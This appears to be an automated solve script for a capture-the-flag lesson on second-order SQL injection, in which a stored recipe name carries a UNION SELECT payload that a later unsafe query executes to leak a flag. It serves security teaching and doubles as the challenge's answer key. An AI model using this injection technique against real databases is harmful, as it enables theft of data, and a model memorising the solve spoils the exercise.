#!/usr/bin/env bash
# Babs's Spellbook, Lesson 5: The Remembering Cauldron - automated solve.
# $TARGET is "host port".
#
# The recipe name is stored with a bound parameter, so nothing happens at
# write time. Later the cauldron interpolates the stored name into its old
# lookup:
#   SELECT ingredient FROM recipes WHERE name = '<stored name>'
# That second, careless use is the second-order injection: poison the name
# with a UNION against the sealed vial, then say "retrieve".
set -euo pipefail
read -r host port <<<"${TARGET:-127.0.0.1 30002}"

name="x' UNION SELECT ingredient FROM sealed_vial --"
flag=$(python3 solution/one-shot.py "$host" "$port" 5 "$name" retrieve)

[[ -n "$flag" ]] || { echo "solve: no flag from $host:$port" >&2; exit 1; }
echo "$flag"
